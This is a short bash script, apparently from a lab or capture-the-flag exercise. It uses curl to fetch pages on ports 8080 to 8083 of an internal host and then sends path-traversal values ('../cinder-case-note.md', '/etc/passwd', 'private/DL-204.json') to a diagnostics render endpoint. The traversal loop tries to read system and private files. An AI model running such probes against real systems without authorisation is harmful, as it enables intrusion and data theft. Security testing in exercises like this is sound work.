set +e
W=http://10.77.40.20
echo "===== 8080 root ====="
curl -sS -m 6 -i "$W:8080/" | head -40
echo; echo "===== 8080 site.webmanifest ====="
curl -sS -m 6 -i "$W:8080/site.webmanifest" | head -40
echo; echo "===== 8081 root ====="
curl -sS -m 6 -i "$W:8081/" | head -30
echo; echo "===== 8082 root ====="
curl -sS -m 6 -i "$W:8082/" | head -30
echo; echo "===== 8083 render public ====="
curl -sS -m 6 -i "$W:8083/api/diagnostics/render?delivery_id=DL-204&view=public/DL-204.json" | head -40
echo; echo "===== 8083 render traversal probe ====="
for v in "../cinder-case-note.md" "cinder-case-note.md" "cases/CINDER.md" "/etc/passwd" "private/DL-204.json" "retired/DL-204.json"; do
 echo "--- view=$v"
 curl -sS -m 6 -w '\n[%{http_code}]\n' --get --data-urlencode "delivery_id=DL-204" --data-urlencode "view=$v" "$W:8083/api/diagnostics/render" | head -c 500; echo
done
